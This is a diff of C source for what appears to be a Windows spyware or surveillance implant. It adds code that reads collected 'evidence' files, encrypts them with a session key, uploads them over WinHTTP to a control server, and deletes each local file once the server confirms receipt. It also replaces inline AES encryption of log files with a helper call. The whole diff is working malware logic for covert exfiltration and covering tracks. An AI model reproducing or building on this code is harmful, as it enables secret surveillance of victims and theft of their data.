@@ -2,7 +2,7 @@
 
 #include "log_files.h"
 #include "binpatched_vars.h"
-#include "aes_alg.h"
+#include "crypt.h"
 #include "win_http.h"
 #include "proto.h"
 
@@ -69,6 +69,7 @@ VOID ProcessEvidenceFiles()
 		PWCHAR pFileName = (PWCHAR)malloc(uFileNameLen * sizeof(WCHAR) + 2);
 		wsprintf(pFileName, L"%s\\%s", pTempPath, pFindDataArray[x].cFileName);
 		
+		BOOL bFileSent = FALSE;
 		HANDLE hFile = CreateFile(pFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 		if (hFile)
 		{
@@ -82,14 +83,24 @@ VOID ProcessEvidenceFiles()
 					*(PULONG)pFileBuff = uFileSize; // fize
 					if (ReadFile(hFile, pFileBuff + sizeof(ULONG), uFileSize, &uOut, NULL))
 					{
-						WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pFileBuff, uFileSize + sizeof(ULONG), (PBYTE)pSessionKey, &pCryptedBuffer));
+						WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pFileBuff, uFileSize + sizeof(ULONG), pSessionKey, &pCryptedBuffer));
 						free(pCryptedBuffer);
-						// FIXME read response & delete file.
+
+						ULONG uResponseLen;
+						PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
+						Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
+						
+						if (*(PULONG)pResponseBuffer == PROTO_OK)
+							bFileSent = TRUE;
+
+						free(pResponseBuffer);
 					}
 					free(pFileBuff);
 				}
 			}
 			CloseHandle(hFile);
+			if (bFileSent)
+				DeleteFile(pFileName);
 		}
 	}
 
@@ -220,12 +231,7 @@ PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditio
 	pTempPtr = (PBYTE)pFinalLogHeader;
 	pTempPtr += sizeof(ULONG);
 
-	BYTE pInitVector[16];
-	aes_context crypt_ctx;
-
-	memset(pInitVector, 0x0, sizeof(pInitVector));
-	aes_set_key(&crypt_ctx, pLogKey, 128);
-	aes_cbc_encrypt(&crypt_ctx, pInitVector, pTempPtr, pTempPtr, uHeaderLen);
+	Encrypt(pTempPtr, uHeaderLen, pLogKey, PAD_NOPAD);
 
 	if (uOutLen)
 		*uOutLen = uPaddedHeaderLen + sizeof(ULONG);
@@ -236,9 +242,6 @@ PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditio
 
 BOOL WriteLogFile(HANDLE hFile, PBYTE pBuffer, ULONG uBuffLen)
 {
-	aes_context pAesContext;
-	PBYTE pInitVector[16];
-
 	if (hFile == INVALID_HANDLE_VALUE || pBuffer == NULL || uBuffLen == 0)
 		return FALSE;
 
@@ -252,10 +255,8 @@ BOOL WriteLogFile(HANDLE hFile, PBYTE pBuffer, ULONG uBuffLen)
 	memcpy(pCryptBuff + sizeof(ULONG), pBuffer, uBuffLen);
 
 	// cifra
-	memset(pInitVector, 0x0, 16);
-	aes_set_key(&pAesContext, pLogKey, 128);
-	aes_cbc_encrypt(&pAesContext, (PBYTE)pInitVector, pCryptBuff+sizeof(ULONG), pCryptBuff+sizeof(ULONG), uBuffLen);
-	
+	Encrypt(pCryptBuff+sizeof(ULONG), uBuffLen, pLogKey, PAD_NOPAD);
+
 	// scrive
 	ULONG uOut, retVal;
 	retVal = WriteFile(hFile, pCryptBuff, uPaddedLen + sizeof(ULONG), &uOut, NULL);
